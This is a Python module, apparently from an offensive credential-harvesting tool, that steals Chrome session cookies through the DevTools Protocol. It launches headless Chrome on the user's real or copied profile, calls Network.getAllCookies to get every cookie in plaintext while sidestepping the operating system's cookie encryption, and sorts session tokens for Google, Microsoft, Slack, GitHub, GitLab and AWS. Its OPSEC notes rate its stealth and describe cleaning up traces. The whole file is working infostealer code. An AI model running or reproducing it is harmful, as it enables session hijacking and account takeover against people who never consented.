"""Universal Chrome cookie extraction via CDP (Chrome DevTools Protocol).

Uses Network.getAllCookies to extract ALL browser cookies in plaintext —
bypasses DPAPI (Windows), Keychain (macOS), peanuts (Linux), and v20
app-bound encryption entirely.

Flow:
  1. Locate Chrome binary + user data directory
  2. Check if Chrome is already running with a debug port (DevToolsActivePort)
  3. If not, launch headless Chrome — try real profile first, fall back to
     temp copy if the profile is locked by a running Chrome instance
  4. Connect CDP, call Network.enable + Network.getAllCookies
  5. Group cookies by service (Google, Microsoft, Slack, etc.)
  6. Return one CollectedToken per service with cookies found

OPSEC:
  - Stealth score 4: launches a headless Chrome process (visible in ps)
  - No network requests — cookies are read locally via CDP
  - Temp profile (if used) is cleaned up immediately after extraction
  - Works on ALL platforms: macOS, Windows, Linux
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import chrome_user_data_dir, get_platform


# ── Service host patterns ────────────────────────────────────────────
# Each key is a logical service name; value is a list of host substrings.
# A cookie whose domain contains ANY substring is assigned to that service.

SERVICE_HOST_PATTERNS: Dict[str, List[str]] = {
    "google": [
        ".google.com",
        "accounts.google.com",
        ".googleapis.com",
        ".youtube.com",
        ".googlevideo.com",
    ],
    "microsoft": [
        ".microsoft.com",
        ".microsoftonline.com",
        ".office.com",
        ".office365.com",
        ".live.com",
        ".sharepoint.com",
        ".teams.microsoft.com",
    ],
    "slack": [
        ".slack.com",
    ],
    "github": [
        ".github.com",
        "github.com",
    ],
    "gitlab": [
        ".gitlab.com",
        "gitlab.com",
    ],
    "aws": [
        ".aws.amazon.com",
        ".amazonaws.com",
        "console.aws.amazon.com",
        ".signin.aws.amazon.com",
    ],
}

# Google session cookies of interest (for convenience method)
_GOOGLE_COOKIE_NAMES = {
    "SID", "HSID", "SSID", "APISID", "SAPISID",
    "__Secure-1PSID", "__Secure-3PSID",
    "__Secure-1PSIDTS", "__Secure-3PSIDTS",
    "__Secure-1PSIDCC", "__Secure-3PSIDCC",
    "NID", "OSID", "LSID",
}

# Slack session cookie
_SLACK_COOKIE_NAMES = {"d"}

# Microsoft session cookies
_MICROSOFT_COOKIE_NAMES = {
    "ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
    "SignInStateCookie", "MUID", "buid",
}

# Files to copy for a minimal temp profile (enough for Chrome to start
# and load cookies from the real profile's cookie store)
_PROFILE_FILES = [
    "Local State",
    "Default/Cookies",
    "Default/Cookies-journal",
    "Default/Cookies-wal",
    "Default/Network/Cookies",
    "Default/Network/Cookies-journal",
    "Default/Network/Cookies-wal",
    "Default/Preferences",
    "Default/Secure Preferences",
    "Default/Login Data",
    "Default/Login Data-journal",
    "Default/Web Data",
    "Default/Web Data-journal",
]


# ── Chrome binary discovery ──────────────────────────────────────────

def _find_chrome() -> Optional[str]:
    """Find the Chrome binary on the current platform."""
    plat = get_platform()
    candidates: List[str] = []

    if plat == "macos":
        candidates = [
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Chromium.app/Contents/MacOS/Chromium",
            os.path.expanduser(
                "~/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
            ),
        ]
    elif plat == "windows":
        for env_var in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
            base = os.environ.get(env_var, "")
            if base:
                candidates.append(
                    os.path.join(base, "Google", "Chrome", "Application", "chrome.exe")
                )
    else:  # Linux
        candidates = [
            "/usr/bin/google-chrome",
            "/usr/bin/google-chrome-stable",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium",
            "/snap/bin/chromium",
        ]

    for path in candidates:
        if os.path.isfile(path):
            return path

    # Fallback: try PATH
    for name in ("google-chrome", "google-chrome-stable", "chromium", "chrome"):
        result = shutil.which(name)
        if result:
            return result

    return None


# ── DevToolsActivePort reader ────────────────────────────────────────

def _read_devtools_port(user_data_dir: Path) -> Optional[Tuple[int, str]]:
    """Read the DevToolsActivePort file from a Chrome user data dir.

    Returns (port, ws_path) if the file exists and the port is reachable,
    otherwise None.
    """
    port_file = user_data_dir / "DevToolsActivePort"
    if not port_file.exists():
        return None

    try:
        content = port_file.read_text().strip()
        lines = content.splitlines()
        if len(lines) < 2:
            return None
        port = int(lines[0].strip())
        ws_path = lines[1].strip()
    except (ValueError, OSError):
        return None

    # Check if the port is actually reachable
    import socket
    try:
        sock = socket.create_connection(("127.0.0.1", port), timeout=2)
        sock.close()
        return (port, ws_path)
    except (OSError, socket.timeout):
        return None


# ── Temp profile copy ────────────────────────────────────────────────

def _copy_minimal_profile(user_data_dir: Path) -> Optional[str]:
    """Copy minimal Chrome profile files to a temp directory.

    Copies just enough for Chrome to start and load the cookie store.
    Returns the temp dir path, or None on failure.
    """
    if not user_data_dir.exists():
        return None

    temp_dir = tempfile.mkdtemp(prefix="ninloader_cdp_cookies_")

    for rel_path in _PROFILE_FILES:
        src = user_data_dir / rel_path
        dst = Path(temp_dir) / rel_path
        if src.exists():
            dst.parent.mkdir(parents=True, exist_ok=True)
            try:
                shutil.copy2(str(src), str(dst))
            except (PermissionError, OSError):
                continue

    # Chrome needs a First Run sentinel to skip setup wizard
    (Path(temp_dir) / "First Run").touch()

    # Patch Preferences to avoid "Restore pages" dialog
    prefs_path = Path(temp_dir) / "Default" / "Preferences"
    if prefs_path.exists():
        try:
            prefs = json.loads(prefs_path.read_text())
            prefs.setdefault("profile", {})["exit_type"] = "Normal"
            prefs.setdefault("profile", {})["exited_cleanly"] = True
            prefs.setdefault("session", {})["restore_on_startup"] = 4
            prefs_path.write_text(json.dumps(prefs))
        except (json.JSONDecodeError, OSError):
            pass

    return temp_dir


# ── Cookie grouping ──────────────────────────────────────────────────

def _match_service(domain: str) -> Optional[str]:
    """Return the service name if the domain matches a known pattern."""
    domain_lower = domain.lower()
    for service, patterns in SERVICE_HOST_PATTERNS.items():
        for pattern in patterns:
            if pattern in domain_lower:
                return service
    return None


def _group_cookies_by_service(
    cookies: List[Dict[str, Any]],
) -> Dict[str, List[Dict[str, Any]]]:
    """Group raw CDP cookies by service based on host patterns."""
    grouped: Dict[str, List[Dict[str, Any]]] = {}
    for cookie in cookies:
        domain = cookie.get("domain", "")
        service = _match_service(domain)
        if service:
            grouped.setdefault(service, []).append(cookie)
    return grouped


# ── The Collector ────────────────────────────────────────────────────

@CollectorRegistry.register
class CDPCookieCollector(BaseCollector):
    """Universal Chrome cookie extraction via CDP — works on ALL platforms.

    Bypasses DPAPI, Keychain, peanuts, and v20 app-bound encryption by
    asking Chrome itself to return cookies in plaintext over CDP.
    """

    service = "chrome"
    source = "cdp_cookies"
    stealth_score = 4
    # No external deps — uses stdlib + our existing CDPClient
    requires: List[str] = []
    # Works everywhere
    platforms: List[str] = []

    def discover(self) -> List[DiscoveredToken]:
        """Check if Chrome binary exists and a profile with cookies is present."""
        results: List[DiscoveredToken] = []

        chrome_bin = _find_chrome()
        chrome_dir = chrome_user_data_dir()
        has_profile = chrome_dir.exists() and (
            (chrome_dir / "Default" / "Cookies").exists()
            or (chrome_dir / "Default" / "Network" / "Cookies").exists()
        )

        if chrome_bin and has_profile:
            # Check if there's already a debug port available
            active_port = _read_devtools_port(chrome_dir)
            port_hint = (
                f"debug port {active_port[0]} already active"
                if active_port
                else "will launch headless Chrome"
            )

            results.append(DiscoveredToken(
                service=self.service,
                source=self.source,
                path=str(chrome_dir),
                account_hint="all Chrome profiles",
                stealth_score=self.stealth_score,
                details=(
                    f"CDP Network.getAllCookies — universal decrypt bypass; "
                    f"platform={get_platform()}; {port_hint}"
                ),
            ))
        else:
            missing = []
            if not chrome_bin:
                missing.append("Chrome binary")
            if not has_profile:
                missing.append("Chrome profile with cookies")
            results.append(DiscoveredToken(
                service=self.service,
                source=self.source,
                path=str(chrome_dir),
                account_hint="",
                stealth_score=self.stealth_score,
                details=f"not available — missing: {', '.join(missing)}",
            ))

        return results

    def collect(self) -> List[CollectedToken]:
        """Extract all cookies from Chrome via CDP and group by service."""
        chrome_bin = _find_chrome()
        if not chrome_bin:
            self._warn("Chrome binary not found")
            return []

        chrome_dir = chrome_user_data_dir()
        if not chrome_dir.exists():
            self._warn(f"Chrome user data dir not found: {chrome_dir}")
            return []

        # Try to get cookies — attempt strategies in order
        cookies = self._try_existing_debug_port(chrome_dir)
        if cookies is None:
            cookies = self._try_launch_with_real_profile(chrome_bin, chrome_dir)
        if cookies is None:
            cookies = self._try_launch_with_temp_profile(chrome_bin, chrome_dir)
        if cookies is None:
            self._warn("All CDP cookie extraction strategies failed")
            return []

        self._info(f"Extracted {len(cookies)} total cookies from Chrome")

        # Group cookies by service and build CollectedTokens
        grouped = _group_cookies_by_service(cookies)
        results: List[CollectedToken] = []

        for svc, svc_cookies in grouped.items():
            # Pick the most important cookie as the primary token
            primary_value = self._pick_primary_cookie(svc, svc_cookies)

            cookie_data = {}
            for c in svc_cookies:
                name = c.get("name", "")
                cookie_data[name] = {
                    "value": c.get("value", ""),
                    "domain": c.get("domain", ""),
                    "path": c.get("path", "/"),
                    "secure": c.get("secure", False),
                    "httpOnly": c.get("httpOnly", False),
                    "sameSite": c.get("sameSite", ""),
                    "expires": c.get("expires", -1),
                }

            results.append(CollectedToken(
                service=svc,
                source=self.source,
                stealth_score=self.stealth_score,
                access_token=secure(primary_value) if primary_value else None,
                extra={
                    "extraction_method": "cdp_network_getAllCookies",
                    "cookies": cookie_data,
                    "cookie_count": len(svc_cookies),
                    "platform": get_platform(),
                },
            ))

            self._info(
                f"  {svc}: {len(svc_cookies)} cookies "
                f"({', '.join(sorted(set(c.get('name', '') for c in svc_cookies[:10])))})"
            )

        return results

    # ── Strategy 1: Existing debug port ──────────────────────────────

    def _try_existing_debug_port(
        self, chrome_dir: Path
    ) -> Optional[List[Dict[str, Any]]]:
        """Try to connect to an already-running Chrome with debug port."""
        active = _read_devtools_port(chrome_dir)
        if not active:
            return None

        port, ws_path = active
        self._info(f"Found existing Chrome debug port: {port}")

        try:
            return self._get_cookies_via_cdp(port)
        except Exception as e:
            self._warn(f"Failed to use existing debug port {port}: {e}")
            return None

    # ── Strategy 2: Launch with real profile ─────────────────────────

    def _try_launch_with_real_profile(
        self, chrome_bin: str, chrome_dir: Path
    ) -> Optional[List[Dict[str, Any]]]:
        """Launch headless Chrome using the real profile directory.

        This only works if no other Chrome instance is running (profile lock).
        """
        self._info("Attempting headless Chrome with real profile...")

        proc = None
        try:
            port, proc = self._launch_headless_chrome(chrome_bin, str(chrome_dir))
            cookies = self._get_cookies_via_cdp(port)
            return cookies
        except Exception as e:
            self._info(f"Real profile launch failed (expected if Chrome is running): {e}")
            return None
        finally:
            self._terminate_chrome(proc)

    # ── Strategy 3: Launch with temp profile copy ────────────────────

    def _try_launch_with_temp_profile(
        self, chrome_bin: str, chrome_dir: Path
    ) -> Optional[List[Dict[str, Any]]]:
        """Launch headless Chrome with a temp copy of the profile.

        Used when the real profile is locked by a running Chrome instance.
        """
        self._info("Copying minimal profile to temp dir for headless extraction...")

        temp_dir = _copy_minimal_profile(chrome_dir)
        if not temp_dir:
            self._warn("Failed to create temp profile copy")
            return None

        proc = None
        try:
            port, proc = self._launch_headless_chrome(chrome_bin, temp_dir)
            cookies = self._get_cookies_via_cdp(port)
            return cookies
        except Exception as e:
            self._warn(f"Temp profile extraction failed: {e}")
            return None
        finally:
            self._terminate_chrome(proc)
            # Clean up temp dir
            if temp_dir:
                shutil.rmtree(temp_dir, ignore_errors=True)

    # ── Chrome launch helper ─────────────────────────────────────────

    def _launch_headless_chrome(
        self, chrome_bin: str, user_data_dir: str
    ) -> Tuple[int, subprocess.Popen]:
        """Launch Chrome in headless mode with remote debugging.

        Uses --remote-debugging-port=0 so Chrome picks a free port, then
        reads the assigned port from DevToolsActivePort.

        Returns (port, process).
        """
        args = [
            chrome_bin,
            "--headless=new",
            f"--user-data-dir={user_data_dir}",
            "--remote-debugging-port=0",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-extensions",
            "--disable-background-networking",
            "--disable-sync",
            "--disable-translate",
            "--disable-component-update",
            "--disable-domain-reliability",
            "--disable-client-side-phishing-detection",
            "--disable-features=MediaRouter",
            "--disable-gpu",
            "--no-sandbox",
            # Navigate to about:blank — we only need cookie access
            "about:blank",
        ]

        proc = subprocess.Popen(
            args,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for DevToolsActivePort file to appear
        port_file = Path(user_data_dir) / "DevToolsActivePort"
        deadline = time.time() + 15
        port = None

        while time.time() < deadline:
            # Check if process died
            if proc.poll() is not None:
                raise RuntimeError(
                    f"Chrome exited immediately with code {proc.returncode} "
                    f"(profile may be locked)"
                )

            if port_file.exists():
                try:
                    content = port_file.read_text().strip()
                    lines = content.splitlines()
                    if lines:
                        port = int(lines[0].strip())
                        break
                except (ValueError, OSError):
                    pass

            time.sleep(0.3)

        if port is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
            raise RuntimeError("Timed out waiting for Chrome DevToolsActivePort")

        self._info(f"Headless Chrome started on debug port {port}")
        return port, proc

    # ── CDP cookie extraction ────────────────────────────────────────

    def _get_cookies_via_cdp(self, port: int) -> List[Dict[str, Any]]:
        """Connect to Chrome CDP and call Network.getAllCookies.

        Returns the raw list of cookie dicts from CDP.
        """
        from ...core.cdp import CDPClient, CDPError

        cdp = CDPClient(port, timeout=10)
        try:
            cdp.connect()
            cdp.send("Network.enable")
            result = cdp.send("Network.getAllCookies")
            cookies = result.get("cookies", [])
            return cookies
        finally:
            cdp.close()

    # ── Chrome termination ───────────────────────────────────────────

    @staticmethod
    def _terminate_chrome(proc: Optional[subprocess.Popen]) -> None:
        """Gracefully terminate a Chrome process."""
        if proc is None:
            return
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                pass
        except OSError:
            pass

    # ── Primary cookie selection ─────────────────────────────────────

    @staticmethod
    def _pick_primary_cookie(
        service: str, cookies: List[Dict[str, Any]]
    ) -> Optional[str]:
        """Pick the most important cookie value for a service.

        Used as the access_token field in CollectedToken.
        """
        cookie_map = {c.get("name", ""): c.get("value", "") for c in cookies}

        if service == "google":
            for name in ("SAPISID", "SID", "__Secure-1PSID", "HSID"):
                if name in cookie_map and cookie_map[name]:
                    return cookie_map[name]
        elif service == "microsoft":
            for name in ("ESTSAUTHPERSISTENT", "ESTSAUTH"):
                if name in cookie_map and cookie_map[name]:
                    return cookie_map[name]
        elif service == "slack":
            if "d" in cookie_map and cookie_map["d"]:
                return cookie_map["d"]
        elif service == "github":
            for name in ("user_session", "dotcom_user", "_gh_sess"):
                if name in cookie_map and cookie_map[name]:
                    return cookie_map[name]
        elif service == "gitlab":
            for name in ("_gitlab_session", "known_sign_in"):
                if name in cookie_map and cookie_map[name]:
                    return cookie_map[name]
        elif service == "aws":
            for name in ("aws-creds", "aws-userInfo", "JSESSIONID"):
                if name in cookie_map and cookie_map[name]:
                    return cookie_map[name]

        # Fallback: return the first non-empty cookie value
        for c in cookies:
            val = c.get("value", "")
            if val:
                return val

        return None

    # ── Convenience methods for other collectors ─────────────────────

    def get_all_cookies(self) -> Optional[List[Dict[str, Any]]]:
        """Extract ALL cookies from Chrome. Returns raw CDP cookie list.

        Convenience method for use by other collectors / modules.
        """
        chrome_bin = _find_chrome()
        if not chrome_bin:
            return None

        chrome_dir = chrome_user_data_dir()
        if not chrome_dir.exists():
            return None

        cookies = self._try_existing_debug_port(chrome_dir)
        if cookies is None:
            cookies = self._try_launch_with_real_profile(chrome_bin, chrome_dir)
        if cookies is None:
            cookies = self._try_launch_with_temp_profile(chrome_bin, chrome_dir)

        return cookies

    def get_cookies_for_service(
        self, service: str
    ) -> Optional[List[Dict[str, Any]]]:
        """Extract cookies for a specific service.

        Args:
            service: One of the keys in SERVICE_HOST_PATTERNS
                     (google, microsoft, slack, github, gitlab, aws).

        Returns:
            List of cookie dicts for that service, or None on failure.
        """
        all_cookies = self.get_all_cookies()
        if all_cookies is None:
            return None

        grouped = _group_cookies_by_service(all_cookies)
        return grouped.get(service)

    def get_google_cookies(self) -> Optional[List[Dict[str, Any]]]:
        """Extract Google session cookies (SID, HSID, SAPISID, etc.)."""
        return self.get_cookies_for_service("google")

    def get_microsoft_cookies(self) -> Optional[List[Dict[str, Any]]]:
        """Extract Microsoft/M365 session cookies."""
        return self.get_cookies_for_service("microsoft")

    def get_slack_cookies(self) -> Optional[List[Dict[str, Any]]]:
        """Extract Slack cookies (d cookie, etc.)."""
        return self.get_cookies_for_service("slack")
